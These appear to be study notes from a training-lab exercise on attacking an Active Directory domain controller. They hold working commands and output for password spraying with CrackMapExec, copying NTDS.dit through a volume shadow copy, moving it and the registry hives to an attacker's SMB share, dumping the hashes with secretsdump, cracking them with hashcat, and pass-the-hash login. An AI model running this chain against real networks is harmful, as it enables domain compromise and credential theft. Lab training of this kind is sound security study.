# Dictionary Attacks against AD accounts using CrackMapExec

-> Identify Username Convention	: jdoe , jjdoe , doe.jane , ...

get some valid email from google using the domain name of the target :
“@inlanefreight.com”

google dorks :
“inlanefreight.com filetype:pdf”
-> find some valid usernames in the PDF properties

## Creating a Custom list of Usernames
cat usernames.txt (manually)
OR
./username-anarchy -i /home/names.txt (automatically)

## Launching the Attack with CrackMapExec

crackmapexec smb $TARGET -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

/usr/share/wordlists/fasttrack.txt : list of commonly used passwords

# Capturing NTDS.dit

NTDS.dit file is stored at %systemroot$/ntds on the domain controllers in a forest

.dit stands for directory information tree.

This is the primary database file associated with AD which stores :
- domain usernames
- password hashes
- other critical schema information

## Connecting to a DC with Evil-WinRM

evil-winrm -i $TARGET -u bwilliamson -p 'P@55w0rd!'

## Checking Local Group Membership

net localgroup

## Checking User Account Privileges including Domain

net user bwilliamson

## Creating Shadow Copy of C:

vssadmin CREATE SHADOW /For=C:

-> C: is the default location of NTDS but it is possible to change the location

## Copying NTDS.dit from the VSS

mkdir NTDS
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

## Transferring NTDS.dit to Attack Host

cmd.exe /c move C:\NTDS\NTDS.dit \\$PWN_BOX$\CompData 

## A Faster Method: Using cme to Capture NTDS.dit

crackmapexec smb $TARGET -u bwilliamson -p P@55w0rd! --ntds

## Cracking Hashes & Gaining Credentials

sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

# Pass-the-Hash Considerations

What if we are unsuccessful in cracking a hash?

A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. 

evil-winrm -i $TARGET  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"

# LAB

crackmapexec smb $TARGET

SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10.0 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)

John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager.

cat usernames.txt 
jmarston
johnmarston
john.marston
marston.john
cjohnson
caroljohnson
carol.johnson
johnson.carol

crackmapexec smb $TARGET -u usernames.txt -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)

evil-winrm -i $TARGET -u jmarston -p 'P@ssword!'

net localgroup

Aliases for \\ILF-DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
...

net user jmarston

Global Group memberships     *Domain Admins        *Domain Users
                             *Leadership

vssadmin CREATE SHADOW /For=C:

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {f0207516-4f9f-4a59-803b-9c3057cda020}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {425f5873-6c27-4163-9fc4-df0b13893e9b}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

mkdir NTDS

cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit


sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/

cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.14.104\CompData 

locate secretsdump

python /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit local -outputfile ntlm-extract

[-] Either the SYSTEM hive or bootkey is required for local parsing, check help

reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

move security.save \\10.10.14.104\CompData
move system.save \\10.10.14.104\\CompData
cmd.exe /c move security.save \\10.10.14.104\CompData 
cmd.exe /c move system.save \\10.10.14.104\CompData 

python /usr/share/doc/python3-impacket/examples/secretsdump.py -security security.save -system system.save -ntds ntds.dit local

[-] [Errno 2] No such file or directory: 'ntds.dit'

python /usr/share/doc/python3-impacket/examples/secretsdump.py -security security.save -system system.save -ntds NTDS.dit local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:cc2e14e88c021c1be2da5be9c8c2ead933201bc62e64f7f1608ff9add8aa8442dde0b639c4b9cdaee835dce04ce2ee82936bf8d46f287c6968b58d026fbd396a2e067d3160f430fa7e6c156a04877a0d993420171fa502a6f4fdf9d4defc9bd39fb405b53039ee2bb1c3f111d9942da2c7b723f1037ff535886e6e607179ac73101e88f27aa9adf90b37603670f4b050e9ab7b7ed7b9d12ecba66fc5ad531b78fbb479cda040486cdbb6c1e78c6beaf12cd7ee5d193bacae84a7053884cf48846e6c67fe2d3d56613363b41aeea06ae57e648bf13e2e805a546a8701b337af04182d0bfe8be85631a4e4f4f6db2c6d4e
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:dee81e516d3a5e00502001988abfc069
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x91605a6ced1362b191874d151b7e183e8273c60b
dpapi_userkey:0xfddc0156308f24b7eb480878ff9eb60caa820661
[*] NL$KM 
 0000   5F 03 DB 6A FD 54 3D 01  47 59 09 C8 F7 91 CE 72   _..j.T=.GY.....r
 0010   F6 28 B7 AD 55 B4 5E A6  9E 9D 7E 3A DE 1E A0 BF   .(..U.^...~:....
 0020   93 FB 4C E5 4D 8E AB 2C  0B 44 7F 3A F1 58 4C 1A   ..L.M..,.D.:.XL.
 0030   29 52 89 14 23 5E C0 A6  FE 2B FC F2 0F CB 13 11   )R..#^...+......
NL$KM:5f03db6afd543d01475909c8f791ce72f628b7ad55b45ea69e9d7e3ade1ea0bf93fb4ce54d8eab2c0b447f3af1584c1a29528914235ec0a6fe2bfcf20fcb1311
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8af61f67a96ac6fb352f192b1cfc6b56:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
[*] Kerberos keys from NTDS.dit 
Administrator:aes256-cts-hmac-sha1-96:a2bfeccd55aca0e53f893d1ae43abcdf0d6aa5793cd5d2dbe8c6f577cbbe5a35
Administrator:aes128-cts-hmac-sha1-96:84a147160d42613b0ffe0bd060dbca9c
Administrator:des-cbc-md5:3ec8540110d3e058
ILF-DC01$:aes256-cts-hmac-sha1-96:50d1401419bf8fe68aa149e67f327af59fc923653e3ebe212345883a3b92bb2d
ILF-DC01$:aes128-cts-hmac-sha1-96:f16761d510325e2640b31a9ef9e5350a
ILF-DC01$:des-cbc-md5:f20b1ae0e0f2986b
krbtgt:aes256-cts-hmac-sha1-96:4c3efde4c6ef4005e67a3d9aa09d91d9325518443e54a914f83839a2ed7d02ec
krbtgt:aes128-cts-hmac-sha1-96:69ef62ae6a467bca3e3aa07495b81a64
krbtgt:des-cbc-md5:6e1fa8f219daa82c
ILF.local\jmarston:aes256-cts-hmac-sha1-96:9e7d0ec693ff443437aae379ee87d07ed42d6745a4eab784eaa54ceff2fa2649
ILF.local\jmarston:aes128-cts-hmac-sha1-96:b106cf089340b2e610710d6a89ea890d
ILF.local\jmarston:des-cbc-md5:5e5dc24ff73ee9a8
ILF.local\cjohnson:aes256-cts-hmac-sha1-96:2d332798b58ed1a9611e2ecabb338aec01fab4519b08ce4986ebc405c851d7fc
ILF.local\cjohnson:aes128-cts-hmac-sha1-96:cf66ade75cbc1c17d55d6abae64a77f3
ILF.local\cjohnson:des-cbc-md5:83f8cbe3386d858a
ILF.local\jstapleton:aes256-cts-hmac-sha1-96:bf06c080a3e7975799a9f58b606fef8a4b2c4f574cb9e7e99c0686971850ca64
ILF.local\jstapleton:aes128-cts-hmac-sha1-96:828fbbc322f3929f1fe164bcae50e310
ILF.local\jstapleton:des-cbc-md5:d057ad893d8a6b2f
ILF.local\gwaffle:aes256-cts-hmac-sha1-96:b3a7e81c743c8457ba643a5c63058af6f8d21f2a71c793ff7058e73f82ff45a0
ILF.local\gwaffle:aes128-cts-hmac-sha1-96:76943b80314d6f172ed66bb7a4ed72ad
ILF.local\gwaffle:des-cbc-md5:8668a2d073764a3e
LAPTOP01$:aes256-cts-hmac-sha1-96:e0b95703b96705adaf6b5ddadb1f9896729e75683e99f55a6c7bf31e32c3a6d0
LAPTOP01$:aes128-cts-hmac-sha1-96:f42fef661ee76d7e5d2062443e569d5d
LAPTOP01$:des-cbc-md5:26ade5ce709bb5e5

sudo vim hashestocrack.txt
d057ad893d8a6b2f
828fbbc322f3929f1fe164bcae50e310

DES
sudo hashcat -m 14000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

AES 128
sudo hashcat -m 26401 hashestocrack.txt /usr/share/wordlists/rockyou.txt

AES 128
sudo hashcat -m 19600 hashestocrack.txt /usr/share/wordlists/rockyou.txt

sudo vim hashestocrack.txt
92fd67fd2f49d0e83744aa82363f021b

sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt


crackmapexec smb $TARGET -u jmarston -p 'P@ssword!' --ntds

